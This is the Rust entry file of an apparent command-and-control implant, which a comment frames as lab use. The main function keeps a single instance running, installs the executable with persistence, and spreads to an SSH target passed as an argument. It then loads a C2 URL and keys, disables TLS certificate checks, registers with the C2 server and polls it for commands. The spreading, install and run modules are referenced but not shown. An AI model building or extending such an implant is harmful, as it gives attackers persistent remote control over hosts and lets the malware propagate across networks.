use single_instance::SingleInstance;
use std::env;

mod config;
mod error;
mod install;
mod register;
mod run;
mod spread;
mod wordlist;

pub use error::Error;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Debug)
        .init();

    // Prevent multiple instances of the agent running simultaneously
    let instance = SingleInstance::new(config::SINGLE_INSTANCE_IDENTIFIER).unwrap();
    if !instance.is_single() {
        log::debug!("Another instance is already running. Exiting.");
        return Ok(());
    }

    // Install the agent (copy executable + set persistence)
    let install_dir = install::install()?;

    // If an SSH target is provided as argument, spread to it then continue
    let mut args = env::args();
    if args.len() == 2 {
        let host_port = args.nth(1).unwrap();
        log::info!("Spreading to {}", &host_port);
        if let Err(e) = spread::spread(install_dir, &host_port) {
            log::warn!("Spread failed: {}", e);
        }
    }

    // Load agent config (C2 URL, crypto keys from .env or env vars)
    let conf = config::Config::load()?;

    // Build HTTP client (TLS with self-signed cert support for lab use)
    let api_client = ureq::AgentBuilder::new()
        .tls_connector(std::sync::Arc::new(
            native_tls::TlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .build()
                .map_err(|e| Error::Internal(format!("TLS build error: {}", e)))?,
        ))
        .build();

    // Register with C2 server (first run) or reload stored UUID (subsequent runs)
    let agent_id = register::get_or_register_agent_id(&api_client, &conf)?;

    log::info!("Agent running as ID: {}", agent_id);

    // Start the C2 command polling loop (never returns)
    run::run(&api_client, conf, agent_id);
}
